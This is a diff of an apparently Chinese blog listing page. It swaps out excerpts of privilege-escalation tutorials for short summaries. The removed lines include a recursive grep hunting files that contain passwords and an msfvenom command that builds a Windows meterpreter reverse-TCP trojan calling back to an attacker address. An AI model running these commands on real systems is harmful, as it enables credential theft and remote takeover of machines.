@@ -238,14 +238,6 @@
             
           
           当我们拿到了一台Linux服务器的低权限账号，于是，我们想要通过技术手段提权至 root 用户权限，以执行更多的操作。
-Linux提权的前提：
-
-拿到了一个低权限的账号
-能上传和下载文件
-机器上有python、java、perl等环境（非必须项）
-
-1.密码相关操作1.查找带有密码相关的文件
-grep --color=auto -rnw &#39;/&#39; -ie  &quot;PASSWOR
         </a>
       </p>
 
@@ -320,11 +312,7 @@ grep --color=auto -rnw &#39;/&#39; -ie  &quot;PASSWOR
           
             
           
-          1.msf提权目标：windows 7 sp1 vl：192.168.8.53
-攻击机：kali ：192.168.8.195
-生成木马：msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.8.195 lport=1234 -f exe &gt;1.exe
-1.直接提权getsystem：在目标非管理员时候会失败
-meterprete
+          本文介绍一些常见的Windows提权方法
         </a>
       </p>
 
@@ -389,14 +377,7 @@ meterprete
           
             
           
-          1.用户权限划分​    system（最高）
-​    Administrator管理员权限
-​    User普通用户权限
-2.权限继承​    例如管理员启动ftp，ftp获得管理员权限
-3.默认用户​    Administrator
-​    Guest 来宾用户
-​    net user 查看系统所有用户
-​        上传cmd执行：url/cmd.exe /c net use
+          如题
         </a>
       </p>
 
